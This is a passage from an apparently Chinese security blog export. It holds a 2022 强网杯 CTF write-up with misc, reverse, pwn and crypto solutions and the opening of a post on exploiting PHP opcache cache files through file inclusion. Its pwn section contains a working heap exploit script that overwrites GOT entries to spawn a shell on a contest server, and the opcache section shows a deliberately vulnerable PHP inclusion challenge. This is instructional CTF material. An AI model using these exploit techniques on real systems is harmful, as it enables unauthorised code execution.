permutations(shuffle_2):<br>            im = draw_img(head + body(body_1, body_2) + tail)<br>            barcodes = pyzbar.decode(im)<br>            pbar.update(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(barcodes) == <span class="hljs-number">0</span>):<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">for</span> barcode <span class="hljs-keyword">in</span> barcodes:<br>                barcodeData = barcode.data.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>                <span class="hljs-built_in">print</span>(barcodeData)<br>                plt.imshow(im)<br>                plt.show()<br></code></pre></td></tr></table></figure>



<h3 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h3><p>binwalkåˆ†ç†å‡ºä¸€ä¸ªå‹ç¼©åŒ…</p>
<p><img src="/img/wp/2022/2022qwbqsn-4.png"></p>
<p>è¿˜æ˜¯lsbè§£å¯†ï¼Œå¯†ç åœ¨å›¾ç‰‡ç»“å°¾ï¼Œ<code>7his_1s_p4s5w0rd</code></p>
<p><img src="/img/wp/2022/2022qwbqsn-5.png"></p>
<p><img src="/img/wp/2022/2022qwbqsn-6.png"></p>
<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h3><p>é€šè¿‡gdbåŠ¨æ€è°ƒè¯•è·å–åœ°å›¾çš„å…¨è²Œ</p>
<p>0å±‚<br> 0  1  1  1 1  1  1  1<br> 0  0  0  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1</p>
<p>1å±‚<br> 1  1  1  1 1  1  1  1<br> 1  1  0  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1</p>
<p>2å±‚<br> 1  1  1  1 1  1  1  1<br> 1  1  0  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  1  1  1</p>
<p>3å±‚<br> 1  1  1  1 1  1  1  1<br> 1  1  0  0 1  1  1  1<br> 1  1  1  0 1  1  1  1<br> 1  1  1  0 1  1  1  1<br> 1  1  1  0 1  0  1  1<br> 1  1  1  0 1  1  1  1<br> 1  1  1  0 0  0  1  1<br> 1  1  1  1 1  1  1  1</p>
<p>4å±‚<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1</p>
<p>5å±‚<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1</p>
<p>6å±‚<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  0  0  0<br> 1  1  1  1 1  1  1  0</p>
<p>7å±‚<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  1  1  0</p>
<p><code>511=64*7+63</code>æ‰€ä»¥ç¨‹åºè¦æ±‚ä»ç¬¬0å±‚çš„å¼€å¤´èµ°åˆ°ç¬¬7å±‚çš„ç»“å°¾</p>
<p>åˆ†åˆ«é€šè¿‡<code>a-ä¸‹ï¼Œb-ä¸Šï¼Œl-å·¦ï¼Œr-å³ï¼Œu-ä¸‹ä¸€å±‚ï¼Œd-ä¸Šä¸€å±‚</code>è¿›è¡Œç§»åŠ¨</p>
<p><img src="/img/wp/2022/2022qwbqsn-7.png"></p>
<p>input: <code>arruuuraaaaarrdbbuuuuuaadrrau</code></p>
<p>flagï¼š<code>flag&#123;6c2a5b75-232d-26ea-c3cc-8f7a924d7357&#125;</code></p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>åˆ©ç”¨åˆ›å»º<code>chunk</code>æ—¶çš„<code>off by null</code>æ¼æ´ï¼Œé€šè¿‡<code>chunk3</code>è®¾ç½®<code>chunk4</code>çš„<code>inuse</code>ä½ä¸º<code>0</code>ï¼Œè¿™æ ·åœ¨é‡Šæ”¾<code>chunk4</code>æ—¶å°±ä¼šè§¦å‘<code>unlink</code></p>
<p>åˆ©ç”¨<code>unlink</code>ï¼Œåœ¨<code>chunk_list</code>ä¸­å†™å…¥<code>chunk_list</code>çš„åœ°å€ï¼Œè¿™æ ·å¯ä»¥è¾¾åˆ°ä»»æ„åœ°å€è¯»å†™,éœ€è¦åœ¨åˆå¹¶ä¹‹å‰å°†<code>chunk3</code>çš„<code>fd-&gt;bk</code>ä¸<code>bk-&gt;fd</code>æŒ‡å‘<code>chunk3</code>,<code>chunk3-&gt;fd</code>ä¸<code>chunk3-&gt;bk</code>ï¼Œå°±ä¸º<code>chunk_list</code>ä¸Šçš„åœ°å€</p>
<p>ç„¶åå› ä¸ºç¨‹åºä¸­<code>strlen</code>å’Œ<code>free</code>éƒ½æ˜¯ä»¥<code>chunk</code>ä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä¿®æ”¹<code>gotè¡¨</code>å†…<code>free</code>çš„å†…å®¹ä¸º<code>pltè¡¨</code>ä¸­çš„<code>puts</code>ï¼Œæ¥è·å–<code>chunk3</code>çš„<code>fd</code>å­—æ®µï¼Œè®¡ç®—å¾—åˆ°<code>libc</code>åœ°å€ï¼Œé€šè¿‡ä¿®æ”¹<code>gotè¡¨</code>ä¸­çš„<code>strlenå†…å®¹</code>ä¸º<code>system</code>åœ°å€ æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;(1 ~ 1024):&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;Content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;Content:&#x27;</span>,data)<br><br>p=remote(<span class="hljs-string">&#x27;101.200.76.17&#x27;</span>,<span class="hljs-string">&#x27;24195&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./b64heap&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>e=ELF(<span class="hljs-string">&#x27;./b64heap&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>free_got=e.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>strlen_got=e.got[<span class="hljs-string">&#x27;strlen&#x27;</span>]<br>puts_plt=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>chunk_list=<span class="hljs-number">0x6020c0</span><br>heap_list=chunk_list<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">3</span>)<br>fd=heap_list+<span class="hljs-number">0x8</span>*<span class="hljs-number">3</span>-<span class="hljs-number">0x18</span><br>bk=heap_list+<span class="hljs-number">0x8</span>*<span class="hljs-number">3</span>-<span class="hljs-number">0x10</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x98</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p64(fd)+p64(bk)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p64(<span class="hljs-number">0x90</span>))<br>free(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#free(3)</span><br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>,p64(heap_list+<span class="hljs-number">0x8</span>*<span class="hljs-number">5</span>))<br>edit(<span class="hljs-number">0</span>,p64(heap_list+<span class="hljs-number">0x8</span>))<br>edit(<span class="hljs-number">3</span>,p64(free_got))<br>edit(<span class="hljs-number">5</span>,p8(<span class="hljs-number">0x80</span>))<br>edit(<span class="hljs-number">0</span>,p64(puts_plt))<br>free(<span class="hljs-number">1</span>)<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>malloc_hook=d-<span class="hljs-number">0x58</span>-<span class="hljs-number">0x10</span><br><br>system=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(strlen_got))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system))<br>edit(<span class="hljs-number">3</span>,p64(strlen_got))<br>edit(<span class="hljs-number">0</span>,p64(system))<br><br>edit(<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;cat flag\n&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2022/2022qwbqsn-8.png"></p>
<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="crypto1"><a href="#crypto1" class="headerlink" title="crypto1"></a>crypto1</h3><p>åªæœ‰Aï¼ŒBå’Œç©ºæ ¼ï¼Œæ˜æ˜¾æ˜¯æ‘©æ–¯<br>å°†<code>A</code>æ›¿æ¢æˆ<code>-</code>ï¼Œ<code>B</code>æ›¿æ¢æˆ<code>.</code>ï¼Œ<code>ç©ºæ ¼</code>æ›¿æ¢<code>/</code></p>
<p>è§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">morse</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.codedict=&#123;<span class="hljs-string">&#x27;.-&#x27;</span>:<span class="hljs-string">&quot;a&quot;</span>,<br>                    <span class="hljs-string">&#x27;-...&#x27;</span>:<span class="hljs-string">&quot;b&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.-.&#x27;</span>:<span class="hljs-string">&quot;c&quot;</span>,<br>                    <span class="hljs-string">&#x27;-..&#x27;</span>:<span class="hljs-string">&quot;d&quot;</span>,<br>                    <span class="hljs-string">&#x27;.&#x27;</span>:<span class="hljs-string">&quot;e&quot;</span>,<br>                    <span class="hljs-string">&#x27;..-.&#x27;</span>:<span class="hljs-string">&quot;f&quot;</span>,<br>                    <span class="hljs-string">&#x27;--.&#x27;</span>:<span class="hljs-string">&quot;g&quot;</span>,<br>                    <span class="hljs-string">&#x27;....&#x27;</span>:<span class="hljs-string">&quot;h&quot;</span>,<br>                    <span class="hljs-string">&#x27;..&#x27;</span>:<span class="hljs-string">&quot;i&quot;</span>,<br>                    <span class="hljs-string">&#x27;.---&#x27;</span>:<span class="hljs-string">&quot;j&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.-&#x27;</span>:<span class="hljs-string">&quot;k&quot;</span>,<br>                    <span class="hljs-string">&#x27;.-..&#x27;</span>:<span class="hljs-string">&quot;l&quot;</span>,<br>                    <span class="hljs-string">&#x27;--&#x27;</span>:<span class="hljs-string">&quot;m&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.&#x27;</span>:<span class="hljs-string">&quot;n&quot;</span>,<br>                    <span class="hljs-string">&#x27;---&#x27;</span>:<span class="hljs-string">&quot;o&quot;</span>,<br>                    <span class="hljs-string">&#x27;.--.&#x27;</span>:<span class="hljs-string">&quot;p&quot;</span>,<br>                    <span class="hljs-string">&#x27;--.-&#x27;</span>:<span class="hljs-string">&quot;q&quot;</span>,<br>                    <span class="hljs-string">&#x27;.-.&#x27;</span>:<span class="hljs-string">&quot;r&quot;</span>,<br>                    <span class="hljs-string">&#x27;...&#x27;</span>:<span class="hljs-string">&quot;s&quot;</span>,<br>                    <span class="hljs-string">&#x27;-&#x27;</span>:<span class="hljs-string">&quot;t&quot;</span>,<br>                    <span class="hljs-string">&#x27;..-&#x27;</span>:<span class="hljs-string">&quot;u&quot;</span>,<br>                    <span class="hljs-string">&#x27;...-&#x27;</span>:<span class="hljs-string">&quot;v&quot;</span>,<br>                    <span class="hljs-string">&#x27;.--&#x27;</span>:<span class="hljs-string">&quot;w&quot;</span>,<br>                    <span class="hljs-string">&#x27;-..-&#x27;</span>:<span class="hljs-string">&quot;x&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.--&#x27;</span>:<span class="hljs-string">&quot;y&quot;</span>,<br>                    <span class="hljs-string">&#x27;--..&#x27;</span>:<span class="hljs-string">&quot;z&quot;</span>,<br>                    <span class="hljs-string">&#x27;.----&#x27;</span>:<span class="hljs-string">&quot;1&quot;</span>,<br>                    <span class="hljs-string">&#x27;..---&#x27;</span>:<span class="hljs-string">&quot;2&quot;</span>,<br>                    <span class="hljs-string">&#x27;...--&#x27;</span>:<span class="hljs-string">&quot;3&quot;</span>,<br>                    <span class="hljs-string">&#x27;....-&#x27;</span>:<span class="hljs-string">&quot;4&quot;</span>,<br>                    <span class="hljs-string">&#x27;.....&#x27;</span>:<span class="hljs-string">&quot;5&quot;</span>,<br>                    <span class="hljs-string">&#x27;-....&#x27;</span>:<span class="hljs-string">&quot;6&quot;</span>,<br>                    <span class="hljs-string">&#x27;--...&#x27;</span>:<span class="hljs-string">&quot;7&quot;</span>,<br>                    <span class="hljs-string">&#x27;---..&#x27;</span>:<span class="hljs-string">&quot;8&quot;</span>,<br>                    <span class="hljs-string">&#x27;----.&#x27;</span>:<span class="hljs-string">&quot;9&quot;</span>,<br>                    <span class="hljs-string">&#x27;-----&#x27;</span>:<span class="hljs-string">&quot;0&quot;</span>,<br>                    <span class="hljs-string">&#x27;..--..&#x27;</span>:<span class="hljs-string">&quot;?&quot;</span>,<br>                    <span class="hljs-string">&#x27;-..-.&#x27;</span>:<span class="hljs-string">&quot;/&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.--.&#x27;</span>:<span class="hljs-string">&quot;(&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.--.-&#x27;</span>:<span class="hljs-string">&quot;)&quot;</span>,<br>                    <span class="hljs-string">&#x27;-....-&#x27;</span>:<span class="hljs-string">&quot;-&quot;</span>,<br>                    <span class="hljs-string">&#x27;.-.-.-&#x27;</span>:<span class="hljs-string">&quot;.&quot;</span>,<br>                    <span class="hljs-string">&#x27;--..--&#x27;</span>:<span class="hljs-string">&#x27;,&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-.-.-.&#x27;</span>:<span class="hljs-string">&#x27;;&#x27;</span>,<br>                    <span class="hljs-string">&#x27;.----.&#x27;</span>:<span class="hljs-string">&#x27;\&#x27;&#x27;</span>&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GetPlain</span>(<span class="hljs-params">self,text</span>):<br>        textlist=text.split(<span class="hljs-string">&#x27;/&#x27;</span>)<br>        detext=<span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> textlist:<br>            detext+=self.codedict[i]<br>        <span class="hljs-keyword">return</span> detext;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">DeBlast</span>(<span class="hljs-params">self,text,detext</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> self.codedict.keys():<br>            <span class="hljs-keyword">if</span> text.find(i)==<span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(text)-<span class="hljs-built_in">len</span>(i))==<span class="hljs-number">0</span>:<br>                    self.delist.append(detext+self.codedict[i])<br>                    <span class="hljs-keyword">continue</span><br>                self.DeBlast(text[<span class="hljs-built_in">len</span>(i):],detext+self.codedict[i])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self,text,seg=<span class="hljs-string">&#x27;/&#x27;</span>,point=<span class="hljs-string">&#x27;.&#x27;</span>,hor=<span class="hljs-string">&#x27;-&#x27;</span>,blast=<span class="hljs-number">0</span>,out=<span class="hljs-number">1</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            key[0]==&#x27;.&#x27;</span><br><span class="hljs-string">            key[1]==&#x27;-&#x27;</span><br><span class="hljs-string">            key[2]==&#x27;/&#x27;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        key=[point,hor,seg]<br>        div=[<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>]<br>        <span class="hljs-keyword">if</span> blast==<span class="hljs-number">0</span>:<br>            self.detext=self.GetPlain(text)<br>            <span class="hljs-keyword">if</span> out:<br>                <span class="hljs-built_in">print</span>(self.detext)<br>            <span class="hljs-keyword">return</span> self.detext<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>                text=text.replace(key[i],div[i])<br>            self.delist=[]<br>            self.DeBlast(text,<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">if</span> out:<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> self.delist:<br>                        <span class="hljs-built_in">print</span>(i)<br>            <span class="hljs-keyword">return</span> self.delist<br>m=morse()<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;classicCrypto.txt&#x27;</span>)<br>d=f.read().splitlines()<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    e=e+m.decode(i)+<span class="hljs-string">&#x27; &#x27;</span><br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2022/2022qwbqsn-9.png"></p>
<p>åœ¨<a href="https://quipqiup.com/%E7%88%86%E7%A0%B4">https://quipqiup.com/çˆ†ç ´</a></p>
<p><code>cryptography is the practice and study of techniques for secure communication in the presence of adversarial behavior, which is divided into classical cryptography and modern cryptography. the main classical cipher types are transposition ciphers, which rearrange the order of letters in a message. an early substitution cipher was the caesar cipher, in which each letter in the plaintext was replaced by a letter some fixed number of positions further down the alphabet. since the development of rotor cipher machines in world war i and the advent of computers in world war ii, cryptography methods have become increasingly complex and its applications more varied. modern cryptography is heavily based on mathematical theory and computer science practice; cryptographic algorithms are designed around computational hardness assumptions. the growth of cryptographic technology has raised a number of legal issues in the information age. cryptography&#39;s potential for use as a tool for espionage and sedition has led many governments to classify it as a weapon and to limit or even prohibit its use and export. in some jurisdictions where the use of cryptography is legal, laws permit investigators to compel the disclosure of encryption keys for documents relevant to an investigation. cryptography also plays a major role in digital rights management and copyright infringement disputes in regard to digital media.the flag is 1d817f23-4e20-9405-bf6d-e83d055316d6, please add flag string and braces yourself, and all letters are lowercase.</code></p>
<p>å¾—åˆ°flagï¼š<code>1d817f23-4e20-9405-bf6d-e83d055316d6</code></p>
<h3 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h3><p>å°†é¢˜ç›®ç»™å‡ºçš„å­—ç¬¦ä¸²è¿›è¡Œæ …æ åå‘ç°ä¸flagå½¢å¼æ¥è¿‘</p>
<p><img src="/img/wp/2022/2022qwbqsn-10.png"></p>
<p>æ ¹æ®flagçš„æ ¼å¼å‘ç°æ•´ä¸ªå­—ç¬¦ä¸²éœ€è¦å¼‚æˆ–32ï¼Œæ ¹æ®é¢˜ç›®æè¿°çš„uuidæ ¼å¼ï¼Œå‘ç°flagä¸­å°å†™çš„<code>l</code>ä¸º<code>-</code>ï¼Œæ‰€ä»¥åŸå…ˆå°å†™çš„å­—ç¬¦åœ¨å¼‚æˆ–32çš„åŸºç¡€ä¸Šè¿˜è¦å‡å»31</p>
<p>è§£é¢˜è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&quot;FvLFArGp[ovpxBpsssD]qCElwwoClsoColwpuvlqFv&quot;</span><br>b=<span class="hljs-string">&quot;FLAG[vxpsDqCElwwoClsoColwpuvlqFvvFrpopBss]&quot;</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>    <span class="hljs-keyword">if</span> i.islower():<br>        e=e+<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">32</span>)-<span class="hljs-number">31</span>)<br>    <span class="hljs-keyword">else</span>:<br>        e=e+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">32</span>)<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2022/2022qwbqsn-11.png"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2022</tag>
        <tag>å¼ºç½‘æ¯</tag>
      </tags>
  </entry>
  <entry>
    <title>opcacheç¼“å­˜åˆ©ç”¨</title>
    <url>/posts/3b0128e6/</url>
    <content><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯opcache"><a href="#ä»€ä¹ˆæ˜¯opcache" class="headerlink" title="ä»€ä¹ˆæ˜¯opcache"></a>ä»€ä¹ˆæ˜¯opcache</h1><p>opencacheæ˜¯ä¸€ç§php7è‡ªå¸¦çš„ç¼“å­˜å¼•æ“ï¼Œå®ƒå°†ç¼–è¯‘è¿‡ä¸€éçš„çš„phpè„šæœ¬ä»¥å­—èŠ‚ç æ–‡ä»¶çš„å½¢å¼ç¼“å­˜åœ¨ç‰¹å®šç›®å½•ä¸­ï¼ˆåœ¨php.iniä¸­æŒ‡å®šï¼‰ã€‚è¿™æ ·èŠ‚çœäº†æ¯æ¬¡è®¿é—®åŒä¸€è„šæœ¬éƒ½è¦åŠ è½½å’Œè§£æçš„æ—¶é—´å¼€é”€ã€‚ï¼ˆå…ˆæ£€æŸ¥æœ‰æ²¡æœ‰binæ–‡ä»¶æœ‰å°±ç›´æ¥ç”¨ï¼‰</p>
<p>é¡¹ç›®github<a href="https://github.com/GoSecure/php7-opcache-override">åœ°å€</a></p>
<h1 id="ä¸€ï¼šopcacheç¼“å­˜-æ–‡ä»¶åŒ…å«"><a href="#ä¸€ï¼šopcacheç¼“å­˜-æ–‡ä»¶åŒ…å«" class="headerlink" title="ä¸€ï¼šopcacheç¼“å­˜+æ–‡ä»¶åŒ…å«"></a>ä¸€ï¼šopcacheç¼“å­˜+æ–‡ä»¶åŒ…å«</h1><p>é¶æœºï¼š<code>lewiserii/php7-opcache-include</code></p>
<p>ä¾‹é¢˜ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//I heard you are good at PHPINFO+LFI, flag is in flag.php, find it my dear noob vegetable hacker.</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$file</span> === <span class="hljs-string">&quot;phpinfo&quot;</span> ) &#123;<br><br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/proc/i&#x27;</span> , <span class="hljs-variable">$file</span>) ) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;private&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;/var/www/html/&quot;</span> . <span class="hljs-variable">$file</span>;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br><br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-variable">$content</span> ) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nothing&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/script|&lt;\?/i&quot;</span>, <span class="hljs-variable">$content</span>) ) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;bypass me&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include_once</span> <span class="hljs-variable">$file</span>;<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>çœ‹ä¸‹opcacheçš„çŠ¶æ€æ˜¯å¼€å¯è¿˜æ˜¯å…³é—­çš„</p>
<p><img src="/img/php/php-opcache-1.png"></p>
<p>ä»ä¸Šå›¾å¯ä»¥å¾—å‡ºç»“è®ºï¼Œåœ¨<code>/var/www/cache/</code>ä¸‹å­˜åœ¨ç€PHPçš„ç¼“å­˜æ–‡ä»¶ï¼Œå…¶å®Œæ•´çš„ç»å¯¹è·¯å¾„æ˜¯<code>/var/www/cache/[ä¸€ä¸ª md5]/var/www/html/flag.php.bin</code></p>
